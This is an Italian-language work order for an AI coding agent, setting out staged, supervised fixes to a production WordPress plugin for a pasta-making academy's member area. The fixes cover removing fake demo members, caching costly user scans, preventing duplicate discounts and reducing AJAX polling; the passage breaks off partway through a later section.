# Istruzioni operative per Claude Code — `gaming-sfogline` 3.271.0 → 3.271.1

**Da incollare come primo messaggio in Claude Code, con il plugin aperto nella cartella di lavoro.**

---

## 0. Contesto e regole d'ingaggio

Questo è `gaming-sfogline` 3.271.0, plugin WordPress su misura per l'area riservata
dell'Accademia della Sfoglia. Gira **in produzione, su un sito reale con utenti reali**.
100 file PHP in `includes/` (38.413 righe), 8.205 righe di JS, 4.344 di CSS,
342 endpoint AJAX distinti, 6+32 Custom Post Type.

**L'analisi è già stata fatta.** Questo documento è il suo risultato. Non ripartire da
zero, non rileggere tutto il plugin, non produrre un nuovo elenco di problemi.
Il tuo compito è **applicare le correzioni qui sotto, una per volta**.

### Regole non negoziabili

1. **Una correzione per volta.** Ogni voce di questo documento è una consegna separata:
   modifica → `php -l` sul file toccato → prova su Local → fermati e aspetta conferma.
   Non applicare due blocchi nello stesso giro.
2. **Non riscrivere, non riorganizzare, non "modernizzare".** Nessun refactor,
   nessuno spostamento di file, nessun rinominamento di funzioni. La correzione
   minima che risolve il problema descritto, e nient'altro.
3. **Non lanciare PHPCS** sull'intero progetto e non consegnare il suo output.
4. **Non mettere in cache `gs_riepilogo_dati()`**: alimenta la Torre di controllo, che
   deve dire la verità in tempo reale a chi la guarda per decidere se agire.
5. **Non proporre il caricamento condizionale dei 100 moduli**: con OPcache il guadagno
   è piccolo e il rischio di rompere endpoint AJAX e cron è concreto.
6. **Mai disattivare o saltare un controllo** per far passare una prova.
7. Il prefisso delle funzioni resta `gs_`. Tutti i file passano `php -l` prima della
   consegna (verificato: al 22/08/2026 sono **tutti puliti**, nessun errore di sintassi).

---

# ORDINE DI LAVORO — leggi qui, poi fermati dove ti dico

Questa è la parte operativa. **Il resto del documento è materiale di riferimento**: serve
a capire *perché*, non a decidere *cosa*. Non partire dal Blocco A: parti da qui.

Sono previsti sei giri. **Adesso devi fare solo il Giro 0 e il Giro 1**, e fermarti.
Ennio rilegge e ti dice se proseguire. Ogni giro è una consegna separata.

---

## GIRO 0 — Togliere le otto sfogline che non esistono

**Perché per prima:** è l'unica correzione che non può rompere niente ed è visibile
adesso da chiunque apra il sito. Sei righe da cancellare.

### Cosa fare

File: `includes/nastro-vetrine.php`. Dentro `gs_sc_nastro_grande_sfogline()`.

**Cancella queste sei righe** (righe 259-264, subito dopo la chiusura del `foreach` sulle
sfogline vere):

```php
	// --- INIZIO DATI DEMO TEMPORANEI (da togliere su richiesta di Ennio) ---
	$nomi_demo = array( 'Marta Colombo', 'Federica Bianchi', 'Silvia Ferraris', 'Chiara Bellini', 'Elena Marchetti', 'Paola Ricci', 'Anna Conti', 'Laura Moretti' );
	foreach ( $nomi_demo as $nome ) {
		$sfogline[] = array( 'nome' => $nome, 'tag' => 'Sfoglina', 'foto' => '', 'url' => '#' );
	}
	// --- FINE DATI DEMO TEMPORANEI ---
```

**Cancella anche il blocco di commento alle righe 239-245**, quello che comincia con
`ATTENZIONE — DATI DIMOSTRATIVI TEMPORANEI`: descrive una cosa che non esiste più, e
lasciarlo farebbe cercare a qualcuno un codice che non c'è. Il resto del docblock
(la descrizione dello shortcode) **resta**.

**Non toccare nient'altro in quel file.** In particolare lascia stare
`if ( ! $sfogline ) { return ''; }` alla riga successiva: gestisce già il caso in cui,
tolti i falsi, non resti nessuna sfoglina, e il nastro grande semplicemente non compare.

### Come verificare

1. `php -l includes/nastro-vetrine.php` → deve dire *No syntax errors*.
2. Cerca in tutto il plugin che non sia rimasto niente:
   `grep -rn "nomi_demo\|Marta Colombo\|DATI DEMO" includes/` → **zero risultati**.
3. Su Local, apri la pagina «Le Sfogline» e controlla il nastro grande: devono restare
   **solo** le sfogline vere con la Vetrina attiva. Se su Local non ce n'è nessuna, il
   nastro non compare: è il comportamento giusto, non un errore.

### Poi FERMATI e scrivi a Ennio

> Giro 0 fatto. Tolti gli otto nomi inventati da `nastro-vetrine.php`.
> Sulla pagina «Le Sfogline» ora restano N sfogline vere.
> Controlla su accademiadellasfoglia.it/le-sfogline/ e dimmi se va bene prima che proceda.

**Non passare al Giro 1 finché Ennio non risponde.** Questa cosa si vede sul sito
pubblico: deve guardarla lui.

---

## GIRO 1 — Far smettere al Nastro di contare tutti gli utenti a ogni visita

**Perché adesso:** il Nastro è acceso in produzione (confermato da Ennio il 22/08/2026).
Ogni singola visita a ogni pagina del sito fa una scansione completa della tabella utenti.
Sulla pagina «Le Sfogline» la fa **due volte**, di cui una completamente sprecata.

Sono due correzioni in un giro solo perché toccano la stessa funzione.

### 1a — Dare una memoria di quindici minuti alla raccolta dei nomi

File: `includes/nastro-vetrine.php`, funzione `gs_nastro_raccogli_voci()` (riga 132).

**All'inizio della funzione**, subito dopo la riga `function gs_nastro_raccogli_voci( $max, $esclusi = array() ) {`, aggiungi:

```php
	// Il Nastro gira su OGNI pagina del sito (wp_footer), per ogni visitatore,
	// anche non collegato. Senza memoria, ogni visita rifà una scansione
	// completa della tabella utenti più due dei CPT partner. Qui la cache è
	// legittima e non contraddice la regola della Torre di controllo: il
	// Nastro è una vetrina che scorre, non un numero che qualcuno guarda per
	// decidere se agire. Una sfoglina nuova che compare un quarto d'ora dopo
	// non fa danno a nessuno.
	$chiave_cache = 'gs_nastro_voci_' . md5( wp_json_encode( array( $max, $esclusi ) ) );
	$in_memoria   = get_transient( $chiave_cache );
	if ( is_array( $in_memoria ) ) {
		return $in_memoria;
	}
```

**Alla fine della funzione**, sostituisci `return $voci;` con:

```php
	set_transient( $chiave_cache, $voci, 15 * MINUTE_IN_SECONDS );
	return $voci;
```

**Attenzione a due cose, entrambe importanti:**

- **Non serve svuotare la cache quando Ennio salva il pannello Caroselli.** La chiave
  contiene già l'hash della configurazione: se cambia un'impostazione o un elenco di
  esclusi, cambia la chiave, e il nastro nuovo si ricostruisce al primo caricamento.
  Non aggiungere `delete_transient()` in `caroselli.php`: sarebbe codice inutile.
- **Verifica che `$voci` contenga solo testo.** Deve essere così (ogni voce è un array di
  stringhe: tipo, tag, nome, foto, simbolo, url) e va bene per un transient. **Se trovi
  che ci finisce dentro un oggetto `WP_User`, fermati e dimmelo invece di procedere**:
  serializzare oggetti utente in un'opzione è un problema diverso e più serio.

**Aggiungi anche un tetto di sicurezza** alla `get_users()` di riga 138, che oggi non ne
ha nessuno — serve per il primo caricamento dopo ogni scadenza:

```php
	foreach ( get_users( array( 'orderby' => 'display_name', 'order' => 'ASC', 'number' => 500 ) ) as $u ) {
```

### 1b — Non calcolare il nastro piccolo sulla pagina che non lo mostra

Stesso file, funzione `gs_render_nastro_vetrine()` (riga 46). Oggi il nastro piccolo su
«Le Sfogline» è nascosto **solo dal CSS**: il PHP lo calcola comunque e il browser lo
butta via.

**Subito dopo il blocco del blackout** (quello che finisce con `return;` intorno alla
riga 57), e **prima** della riga `$voci = gs_nastro_raccogli_voci( ... );`, aggiungi:

```php
	// Sulla pagina «Le Sfogline» c'è già il nastro grande dedicato, e il CSS
	// nasconde questo. Ma nasconderlo con display:none non evita di calcolarlo:
	// meglio non montarlo affatto (prima di questa riga la tabella utenti veniva
	// scansionata due volte su quella pagina, una delle due per niente).
	$pagina_sfogline = (int) get_option( 'gs_page_sfogline' );
	if ( $pagina_sfogline && is_page( $pagina_sfogline ) ) {
		return;
	}
```

**Usa `get_option( 'gs_page_sfogline' )`, non il numero 64342.** Quell'id è
l'identificativo della pagina sul sito vero e su Local è diverso: scriverlo a mano
farebbe funzionare la correzione in produzione e non in prova, che è il modo peggiore di
sbagliare.

**Non togliere ancora la riga di CSS** `body.page-id-64342 #gs-nastro-fisso { display: none !important; }`
(`assets/css/gaming.css:2174`). Diventa superflua, ma toglierla adesso significa che se il
controllo PHP non funziona il nastro doppio ricompare sul sito vero. Si toglie al giro
dopo, quando questa correzione è stata vista funzionare in produzione.

### Come verificare — e questa volta serve misurare

1. `php -l includes/nastro-vetrine.php`.
2. Su Local, con **Query Monitor** attivo:
   - apri una pagina qualsiasi (non «Le Sfogline») e **annota il numero di query**;
   - **ricarica la stessa pagina**: il secondo caricamento deve farne **molte di meno**.
     Se il numero non cambia, il transient non sta lavorando: fermati e capisci perché,
     non consegnare.
   - aspetta 15 minuti (o cancella il transient a mano) e ricarica: deve ricostruirsi.
3. Apri la pagina «Le Sfogline» e verifica **entrambe** le cose:
   - il nastro **grande** c'è ancora e funziona;
   - il nastro **piccolo** sotto il menu non c'è (com'era prima, ma ora perché non viene
     nemmeno calcolato);
   - in Query Monitor, la scansione utenti compare **una volta sola**, non due.
4. Su una pagina normale, controlla che il nastro piccolo **ci sia ancora** e scorra:
   la correzione 1b non deve averlo spento dappertutto. Questo è l'errore più probabile
   di tutto il giro — provalo davvero, non darlo per scontato.

### Poi FERMATI e scrivi a Ennio

> Giro 1 fatto. Il Nastro ora si ricalcola una volta ogni 15 minuti invece che a ogni
> visita, e sulla pagina «Le Sfogline» non viene più calcolato due volte.
> Misurato su Local: da N query a M query al secondo caricamento.
> Controlla sul sito vero che il nastro si veda ancora sulle pagine normali e che «Le
> Sfogline» sia a posto, poi dimmi se procedo.

---

## GIRI DA 2 A 6 — non farli adesso

Quando Ennio ti dà il via, l'ordine è questo. Per ognuno, il documento più sotto ha la
voce completa con file, righe, codice e compromessi.

| Giro | Voci | Che problema risolve |
|---|---|---|
| **2** | A1, C1, C2 | La chiusura del mese può raddoppiare gli sconti, e può non scattare mai |
| **3** | A2, E4 | Un doppio clic brucia due livelli corso |
| **4** | A5, E5 | Cinque richieste ogni 15 secondi per ogni scheda aperta |
| **5** | B1, B2, B5, B6, B3, B4 | Premi, token e messaggi consegnati due volte |
| **6** | F1, F3, testi di F2, poi D ed E | Punti coltivabili, backup, interruttori morti |

**Regole che valgono per tutti i giri:**

- Una voce per volta dentro il giro, con `php -l` dopo ognuna.
- **Mai** disattivare o saltare un controllo per far passare una prova.
- Se una correzione richiede una scelta che il documento non ha già deciso, **fermati e
  chiedi a Ennio** invece di sceglierla tu.
- Se durante il lavoro trovi un problema che non è in questo documento: **scrivilo, non
  correggerlo.** Ennio decide se entra in questo lavoro o nel prossimo.

## Se qualcosa va storto

Il plugin gira in produzione. Se dopo una consegna qualcosa si comporta diversamente dal
previsto sul sito vero, **la cosa giusta è tornare indietro subito**, non correggere
sopra in fretta: rimetti il file com'era, dillo a Ennio, e ricomincia da capo con calma.
Ogni giro tocca pochi file proprio perché tornare indietro sia semplice.

---

### Legenda

- **VERIFICATO** = letto nel codice, catena completa ricostruita, non serve altro per crederci.
- **DA VERIFICARE** = plausibile dalla lettura, ma dipende da come è configurato il server
  o da un dato che non si vede nel codice. Non trattarlo come certo.

---

# BLOCCO A — Da correggere prima di tutto

## A1 · CRITICO — La chiusura del mese può raddoppiare gli sconti e inondare di email

**File:** `includes/buono-sfoglia.php:69-124` (`gs_buono_sfoglia_chiudi_mese()`)
**Stato:** VERIFICATO

### Cosa succede oggi

Il docblock dichiara "Idempotente per mese". **Non lo è.** La funzione:

1. cicla su **tutti** gli utenti (`get_users( array( 'fields' => 'ID' ) )`, riga 82);
2. per ognuno manda **due** messaggi (`gs_mail_progetto()` riga 105, `gs_invia_messaggio()` riga 111);
3. se ha vinto, aggiunge **+2,5%** con `gs_buono_sfoglia_aggiungi()` (riga 120);
4. scrive la protezione contro la doppia esecuzione — `update_option( 'gs_buono_sfoglia_mese_chiuso', $ym )` —
   **solo alla riga 123, dopo il ciclo**.

Con 200 sfogline sono 400 invii in una sola richiesta PHP. Se scatta il
`max_execution_time` o il limite orario di posta dell'hosting, il ciclo muore a metà
e l'opzione non viene mai scritta. Il giorno dopo il cron riparte **da capo**: chi era
già stato elaborato riceve di nuovo le email e — questo è il punto grave —
`gs_buono_sfoglia_aggiungi()` somma **un altro 2,5%**, perché la percentuale non ha
alcun controllo di doppione. Il badge sì (`in_array( $badge_key, $badges, true )`,
riga 159), la percentuale no (riga 149: `min( 100, gs_buono_sfoglia_pct( $uid ) + $pct )`).

Il ciclo può ripetersi ogni giorno finché non completa. Il 2,5% è uno sconto vero su
un corso vero: è un errore contabile, non un fastidio.

### Correzione minima

Il marcatore va **per singola sfoglina, non globale**, e va scritto **prima** degli
effetti esterni, non dopo:

```php
foreach ( get_users( array( 'fields' => 'ID' ) ) as $uid ) {
    $uid = (int) $uid;
    if ( ! gs_e_sfoglina_vera( $uid ) ) {
        continue;
    }
    // Marcatore per utente: una ripresa a metà riparte da dove si era fermata.
    $chiave_fatto = 'gs_buono_mese_' . $ym;
    if ( get_user_meta( $uid, $chiave_fatto, true ) ) {
        continue; // già elaborata per questo mese
    }
    update_user_meta( $uid, $chiave_fatto, 1 );   // PRIMA degli effetti esterni

    // ... resoconto, messaggio privato, assegnazione ...
}
```

**In più — elaborare a scaglioni.** Anche con il marcatore per utente, 400 invii in una
richiesta restano un rischio. Elaborare 100 sfogline per volta e riaccodare il cron:

```php
$elaborate = 0;
foreach ( get_users( array( 'fields' => 'ID' ) ) as $uid ) {
    if ( $elaborate >= 100 ) {
        wp_schedule_single_event( time() + 300, 'gs_buono_sfoglia_riprendi', array( $ym ) );
        return $assegnati; // NON scrivere gs_buono_sfoglia_mese_chiuso qui
    }
    // ...
    $elaborate++;
}
update_option( 'gs_buono_sfoglia_mese_chiuso', $ym ); // solo quando il giro è finito davvero
```

e registrare `add_action( 'gs_buono_sfoglia_riprendi', 'gs_buono_sfoglia_chiudi_mese' );`.

**Compromesso da dichiarare:** i marcatori `gs_buono_mese_AAAA-MM` sono una riga di
usermeta per sfoglina per mese, che nessuno cancella. Con 200 sfogline sono 2.400 righe
l'anno. Accettabile, ma va messo in conto una pulizia annuale (vedi G3).

**Questo schema è il modello di ciò che cerchiamo: si ripete in altri 6 punti del
plugin — vedi tutto il Blocco B.**

---

## A2 · ALTO — Un doppio clic sul pulsante "sconto applicato" brucia due livelli corso

**File:** `includes/sconto-corsi.php:112-131` (`gs_sconto_applica()`),
chiamata da `includes/sconto-corsi.php:165-181` (`gs_ajax_sconto_applica()`)
**Stato:** VERIFICATO — **non era nella revisione precedente**

### Cosa succede oggi

`gs_sconto_applica()` fa tre cose, senza nessun controllo di doppione:

```php
$livello_usato = gs_sconto_livello_corrente( $uid );
$pct_usata     = gs_sconto_percentuale( $uid );
update_user_meta( $uid, 'gs_sconto_pct', 0 );          // azzera
$prossimo = gs_sconto_prossimo_livello( $livello_usato );
if ( $prossimo ) {
    update_user_meta( $uid, 'gs_sconto_livello', $prossimo );  // AVANZA IL LIVELLO
}
```

L'endpoint AJAX `gs_sconto_applica` ha nonce e `gs_can_manage()`, ma **nessun marcatore
sulla prenotazione**. Se il gestore clicca due volte sul pulsante (doppio clic, rete
lenta, pulsante che non si disabilita), la funzione gira due volte:

- primo giro: sconto azzerato, livello `base` → `avanzato`;
- secondo giro: `pct_usata` = 0, ma il livello avanza ancora, `avanzato` → `professionale`.

**La sfoglina perde per sempre il livello Avanzato** — cioè un intero ciclo di sconti che
avrebbe potuto accumulare, senza aver fatto il corso. E nello storico restano due voci
"consumo", di cui una a 0%.

È lo stesso difetto segnalato come minore per `gs_buono_sfoglia_applica()` (vedi E4),
ma qui l'effetto non è cosmetico: distrugge uno stato che non si può ricostruire
automaticamente, perché il plugin non registra quale livello *avrebbe dovuto* essere.

### Correzione minima

Marcare la prenotazione e rifiutare la seconda chiamata, nell'handler AJAX:

```php
function gs_ajax_sconto_applica() {
    check_ajax_referer( 'gs_ajax', 'nonce' );
    if ( ! gs_can_manage() ) { wp_send_json_error( array( 'message' => 'Permesso negato.' ) ); }
    $pren = isset( $_POST['pren'] ) ? (int) $_POST['pren'] : 0;
    if ( 'gs_prenotazione' !== get_post_type( $pren ) ) {
        wp_send_json_error( array( 'message' => 'Prenotazione non valida.' ) );
    }
    if ( get_post_meta( $pren, 'gs_sconto_applicato', true ) ) {
        wp_send_json_error( array( 'message' => 'Lo sconto per questa prenotazione era già stato applicato.' ) );
    }
    $uid = (int) get_post_meta( $pren, 'gs_cliente', true );
    if ( ! $uid ) { wp_send_json_error( array( 'message' => 'Sfoglina non trovata.' ) ); }
    update_post_meta( $pren, 'gs_sconto_applicato', 1 );   // PRIMA di applicare
    gs_sconto_applica( $uid, $pren );
    wp_send_json_success( array( 'message' => 'Sconto applicato: livello aggiornato.' ) );
}
```

e in `gs_sconto_applica()` non far avanzare il livello se non c'era niente da spendere:

```php
$pct_usata = gs_sconto_percentuale( $uid );
if ( $pct_usata <= 0 ) {
    return false; // niente da consumare: non azzerare, non avanzare, non scrivere nello storico
}
```

**Compromesso:** con il marcatore sulla prenotazione, se il gestore sbaglia persona non
può più "riapplicare" da quella prenotazione. Va aggiunto, nel pannello, un modo per
togliere il marcatore — oppure si accetta che la correzione si faccia a mano dalla
scheda personale. Chiedere a Ennio quale delle due preferisce **prima** di scrivere il codice.

---

## A3 · CRITICO — Il Nastro delle Vetrine scansiona tutta la tabella utenti a ogni pagina del sito

> **QUESTA È LA PRIMA COSA DA CORREGGERE, PRIMA ANCORA DI A1.**
> Nella prima stesura questo punto era condizionato a un interruttore che di default è
> spento. **Ennio ha confermato il 22/08/2026 che il Nastro è acceso sul sito vero**
> (`accademiadellasfoglia.it`), in modalità a corsia singola. Non è più un problema
> potenziale: è un costo che il sito paga adesso, a ogni visita, tutto il giorno.

**File:** `includes/nastro-vetrine.php:44` (`add_action( 'wp_footer', 'gs_render_nastro_vetrine' )`),
`includes/nastro-vetrine.php:132-138` (`gs_nastro_raccogli_voci()`)
**Stato:** VERIFICATO nel codice + **confermato acceso in produzione**

### Nota sul nome: «footer» è fuorviante

Il gancio è `wp_footer`, ma questo dice solo **quando** l'HTML viene stampato. Dove si
vede lo decide il CSS (`assets/css/gaming.css:2176`):
`position: fixed !important; top: var( --gs-header-h, 0px ) !important;`.
**La striscia compare in cima a ogni pagina, fissa sotto il menu del tema** — non in fondo.
Non cambia niente sulla sostanza tecnica; cambia solo come descriverlo a Ennio.

### Cosa succede oggi

`gs_render_nastro_vetrine()` è agganciato a `wp_footer`. `wp_footer` gira su **ogni
pagina del sito pubblico**: home, articoli del blog, pagina contatti, tutto — per ogni
visitatore, **anche non collegato**, e per ogni passaggio dei motori di ricerca.

Dentro, `gs_nastro_raccogli_voci()` fa:

```php
foreach ( get_users( array( 'orderby' => 'display_name', 'order' => 'ASC' ) ) as $u ) {
    if ( ! gs_e_sfoglina_vera( $u ) || ! gs_vetrina_disponibile( $u->ID ) || ... ) continue;
    $level = gs_get_level( $u->ID );
    ... gs_bio_foto_url( $u->ID ) ... gs_vetrina_url( $u->ID ) ...
}
```

`get_users()` **senza `'number'`**: tutta la tabella utenti. Poi, per ogni riga:
`gs_e_sfoglina_vera()` (tre `get_user_meta` più `user_can`, che carica ruoli e capacità),
`gs_vetrina_disponibile()` (altri due controlli), `gs_get_level()`, `gs_bio_foto_url()`,
`gs_vetrina_url()` (che fa anche `get_permalink`). Poi `gs_art_elenco()` e
`gs_scu_elenco()` — due `get_posts` con `posts_per_page => -1` e una lettura di meta
per riga. **Nessuna cache, nessun limite.**

Tradotto: **una scansione completa della tabella utenti, più due scansioni complete di
due CPT, a ogni singola visualizzazione di pagina di tutto il sito.** Su questa scala è
di gran lunga il percorso più caro del plugin — molto più caro di
`gs_classifica_mensile_dati` (A4), che almeno richiede che qualcuno stia fermo sulla
pagina Classifica.

### La corsia singola NON ha ridotto il costo — e questo è il punto meno intuitivo

Il sito è in modalità a **corsia singola** (`nastro_modalita` = `singolo` o `grande`).
Verrebbe da pensare che una fila invece di due costi la metà. **Non è così, e il motivo è
nell'ordine delle righe:**

```php
$voci = gs_nastro_raccogli_voci( $cfg['nastro_max'], $cfg );   // riga 59 ← TUTTO IL COSTO È QUI
// ...
$modalita = $cfg['nastro_modalita'];                            // riga 85 ← letta DOPO
// ...
if ( 'doppio' === $modalita ) {                                 // riga 101
    $voci_dx = gs_nastro_intervalla( array_reverse( $voci ), $sponsor );   // solo un array_reverse
}
```

La raccolta dei dati avviene **prima** che la modalità venga letta, e la seconda fila
riusa lo stesso array già in memoria (`array_reverse`), senza una query in più.

**Quindi: corsia singola = stesse identiche query, metà dell'HTML.** Il risparmio è
qualche kilobyte di pagina, zero sul database. Chi ha scelto la corsia singola pensando
di alleggerire il sito non ha alleggerito niente. **Dillo esplicitamente a Ennio**, perché
è il tipo di dettaglio che porta a credere che il problema sia già stato mitigato.

### A3-bis · Su «Le Sfogline» il conto si fa DUE volte

**File:** `assets/css/gaming.css:2174` — VERIFICATO, **nuovo**

```css
body.page-id-64342 #gs-nastro-fisso { display: none !important; }
```

Sulla pagina *Le Sfogline* (`/le-sfogline/`, id 64342) il nastro piccolo è nascosto
perché lì c'è già il nastro grande dedicato. Ma è nascosto **solo dal CSS**:
`gs_render_nastro_vetrine()` non ha nessun controllo di pagina, quindi su quella pagina
il PHP **esegue comunque la scansione completa, monta tutto l'HTML, e il browser lo butta
via senza disegnarlo**.

E il nastro grande (`gs_sc_nastro_grande_sfogline()`, riga 247) fa **una seconda
`get_users()` senza limite**, con gli stessi controlli per riga.

**Su `/le-sfogline/` la tabella utenti viene scansionata per intero due volte per ogni
visita, e una delle due è interamente sprecata.**

**Correzione (due righe, da fare insieme ad A3):** aggiungere il controllo di pagina nel
PHP, all'inizio di `gs_render_nastro_vetrine()`, dopo il controllo sul blackout:

```php
$pagina_sfogline = (int) get_option( 'gs_page_sfogline' );
if ( $pagina_sfogline && is_page( $pagina_sfogline ) ) {
    return; // lì c'è il nastro grande: non calcolare nemmeno quello piccolo
}
```

Usare `get_option( 'gs_page_sfogline' )` e non il numero 64342 scritto a mano: l'id è
diverso su Local e si romperebbe alla prima prova. Una volta fatto questo, **la riga CSS
2174 diventa superflua** e si può togliere — ma toglila solo dopo aver verificato su
Local che il controllo PHP funzioni, non prima.

### Correzione minima

Mettere in cache il **risultato già montato**, non i pezzi:

```php
function gs_nastro_raccogli_voci( $max, $esclusi = array() ) {
    $chiave = 'gs_nastro_voci_' . md5( wp_json_encode( array( $max, $esclusi ) ) );
    $cache  = get_transient( $chiave );
    if ( is_array( $cache ) ) {
        return $cache;
    }
    // ... corpo attuale, invariato ...
    set_transient( $chiave, $voci, 15 * MINUTE_IN_SECONDS );
    return $voci;
}
```

Qui la cache è la scelta giusta e non contraddice la regola della Torre di controllo:
il Nastro è una vetrina decorativa che scorre, non un numero che qualcuno guarda per
decidere se agire. Una sfoglina nuova che compare 15 minuti dopo non fa danno a nessuno.

Svuotare il transient dove si tocca la composizione del nastro — nel salvataggio di
`includes/caroselli.php:489` e quando cambia lo stato Vetrina di una sfoglina —
oppure lasciarlo scadere da solo, che per 15 minuti è accettabile.

**In più**, aggiungere comunque un tetto duro a `get_users()`:
`array( 'number' => 500, 'orderby' => 'display_name', 'order' => 'ASC' )`. Serve come
rete di sicurezza il giorno in cui la cache non c'è (primo caricamento dopo la scadenza,
object cache assente).

---

## A4 · ALTO — La classifica mensile scansiona tutti gli utenti ogni 20 secondi, senza autenticazione

**File:** `includes/classifica-mensile.php:64-65` (registrazione, anche `nopriv`),
`includes/classifica-mensile.php:38-57` (`gs_classifica_mensile_top()`),
`assets/js/gaming.js:8203` (`setInterval( aggiorna, 20000 )`)
**Stato:** VERIFICATO — già nella revisione precedente, riportato qui integrale

### Cosa succede oggi

`gs_classifica_mensile_dati` è registrato **anche come `nopriv`**. Ogni chiamata esegue
`get_users()` con `'number' => -1` su tutta la tabella utenti, poi
`gs_e_sfoglina_vera()` per ognuno (che a sua volta interroga i permessi) e un
`get_user_meta()` per riga.

Il polling è a 20 secondi: **180 scansioni complete della tabella utenti all'ora, per
ogni scheda del browser lasciata aperta sulla pagina Classifica**, da parte di chiunque,
anche non collegato. Dieci schede aperte sono 1.800 scansioni all'ora.

### Nota da riportare per intero, perché è una correzione di rotta

Il commento in cima al file (righe 16-22) cita esplicitamente il ragionamento sulla
Torre di controllo — *"mai congelare un numero vero dietro una cache"* — per giustificare
l'assenza di cache qui. **Quel consiglio non si applica a questo caso.** Valeva per un
pannello aperto da una o due persone, dove quattordici query a caricamento non sono
nulla e un numero stantìo distrugge la fiducia nello strumento.

La regola corretta è: **non mettere in cache un dato che una persona guarda per decidere
se agire; mettila senz'altro su un dato che un browser richiede da solo ogni venti secondi.**

Quando applichi la correzione, **riscrivi anche quel commento**, altrimenti la prossima
persona che legge il file rifarà la stessa scelta.

### Correzione minima, in quest'ordine

1. **Transient di 60 secondi** sul risultato di `gs_classifica_mensile_top()` — una
   classifica non cambia in modo percettibile in un minuto:
   ```php
   function gs_classifica_mensile_top( $limit = 10, $ym = null ) {
       $ym    = $ym ? $ym : date( 'Y-m', current_time( 'timestamp' ) );
       $chiave = 'gs_cm_top_' . $ym . '_' . (int) $limit;
       $cache  = get_transient( $chiave );
       if ( is_array( $cache ) ) { return $cache; }
       // ... corpo attuale ...
       set_transient( $chiave, $out, MINUTE_IN_SECONDS );
       return $out;
   }
   ```
   Attenzione: il transient conterrebbe oggetti `WP_User` serializzati. Meglio salvare
   solo `array( 'id', 'nome', 'punti' )` e ricostruire il minimo indispensabile, per non
   gonfiare la riga di opzione.
2. **Portare il polling da 20 a 120 secondi** (`assets/js/gaming.js:8203`).
3. **Fermare il polling quando la scheda resta inattiva a lungo**, non solo quando è
   nascosta. `document.hidden` (riga 8189) copre già il cambio di scheda, non la scheda
   aperta e dimenticata davanti a chi è andato a pranzo. Un contatore che spegne
   l'intervallo dopo, per esempio, 20 giri senza interazione, e lo riaccende al primo
   `mousemove`/`focus`.
4. **Se il pubblico non ha bisogno dell'aggiornamento dal vivo, togliere del tutto la
   registrazione `nopriv`** (riga 65). Questa è la correzione più efficace: da chiedere
   a Ennio.

---

## A5 · ALTO — Due query pesanti a ogni caricamento di pagina, più cinque polling a 15 secondi

**File:** `gaming-sfogline.php:576-581` (dentro `gs_enqueue_assets()`, agganciata a
`wp_enqueue_scripts` a riga 603), `assets/js/gaming.js:6572, 6599, 6649, 6671, 7048, 7448`
**Stato:** VERIFICATO — **non era nella revisione precedente**

### Cosa succede oggi — parte 1: a ogni pagina

`gs_enqueue_assets()` gira su **ogni pagina del sito**, non solo su quelle del plugin.
Per ogni utente collegato calcola, in linea:

```php
$non_letti      = (int) gs_messaggi_non_letti( get_current_user_id() );   // riga 577
$conv_non_letti = (int) gs_conv_non_letti( get_current_user_id() );        // riga 581
```

- `gs_messaggi_non_letti()` (`includes/messaggi.php`) fa un `get_posts` con
  `posts_per_page => 100` e una `meta_query` in OR, poi una `get_post_meta` per ogni
  messaggio trovato.
- `gs_conv_non_letti()` (`includes/conversazioni.php:174` → `gs_conv_di_utente()`) fa un
  altro `get_posts` con `posts_per_page => 100` e `meta_query` in OR, poi per **ogni**
  conversazione legge `gs_msgs` — un array serializzato che contiene *tutti* i messaggi
  di quella conversazione — e lo scorre messaggio per messaggio.

Per un esperto (Rina, Bruno) che è parte di molte conversazioni, questo significa
deserializzare decine di array di messaggi **su ogni pagina che apre**, compresa la home.

### Cosa succede oggi — parte 2: e poi ogni 15 secondi

Le stesse due funzioni sono anche i due endpoint di polling, insieme ad altri tre:

| Endpoint | Intervallo | gaming.js |
|---|---|---|
| `gs_msg_conteggio` | 15 s | 6572 |
| `gs_conv_conteggio` | 15 s | 6599 |
| `gs_aeroplanino_ultimo` (solo gestori) | 15 s | 6649 |
| `gs_voli_preleva` | 15 s | 6671 |
| `gs_palloncini_ultimo` | 15 s | 7048 |
| `gs_palloncino_gigante_ultimo` | 15 s | 7448 |

Sono **5 richieste ogni 15 secondi per ogni sfoglina collegata (6 per i gestori)**:
1.200-1.440 chiamate a `admin-ajax.php` all'ora per scheda aperta, ognuna delle quali
avvia WordPress da capo e include tutti e 100 i moduli del plugin. Contro le 180/ora
di A4, che nella revisione precedente era già stata giudicata "di gran lunga la cosa
più pesante del plugin": **non lo è.**

`gs_voli_preleva` in più esegue `gs_programma_esegui_dovuti()` due volte a ogni giro
(`includes/volo-notifiche.php:64-67`) e fa una `delete_user_meta` a ogni chiamata anche
quando la coda è vuota (riga 75).

### Correzione minima, in quest'ordine

1. **Togliere le due query da `gs_enqueue_assets()`.** I due numeri servono solo a far
   partire l'aeroplanino "messaggio in arrivo" al primo caricamento — cosa che il primo
   giro di polling farebbe comunque un attimo dopo. Passare `0` e lasciare che sia il
   polling a stabilire il valore iniziale. Se il primo aeroplanino deve restare
   istantaneo, tenerli ma dietro `if ( is_page( ... ) )` sulle sole pagine del plugin.
2. **Unificare i cinque endpoint in uno solo.** Un unico `gs_battito` che restituisce
   `{ msg, conv, voli, aereo, palloncini, pg }` in una risposta. Da 5 boot di WordPress
   ogni 15 s si passa a 1: **–80% di richieste**, a parità di comportamento visibile.
   È la correzione con il miglior rapporto tra effetto e rischio di tutto il documento.
3. **Portare l'intervallo da 15 a 30 secondi** e applicare lo stesso spegnimento per
   inattività prolungata descritto in A4.3 (una sola volta, sull'endpoint unificato).
4. In `gs_voli_preleva`, chiamare `gs_programma_esegui_dovuti()` **solo se è passato
   almeno un minuto dall'ultima esecuzione** (un transient basta), invece che a ogni giro.

**Compromesso da dichiarare a Ennio:** a 30 secondi, un palloncino o un aeroplanino
possono comparire fino a mezzo minuto dopo l'invio invece di 15 secondi. Se non gli va
bene, tenere l'endpoint unificato a 15 secondi: il grosso del guadagno viene comunque
dall'unificazione, non dall'intervallo.

---

# BLOCCO B — Lo stesso schema di A1, ripetuto altrove

La revisione precedente chiedeva: *"verifica se lo stesso schema si ripete altrove"*.
**Sì, in sei punti.** Sono tutti la stessa forma: *ciclo lungo con effetti esterni
(email, punti, crediti), protezione contro la ripetizione scritta solo alla fine.*

La correzione è sempre la stessa: **spostare il marcatore prima dell'effetto, e
renderlo per elemento invece che globale.** Usa `gs_abbonamento_controlla_scadenze()`
(`includes/abbonamenti.php:112-141`) come modello di come va fatto: lì il marcatore
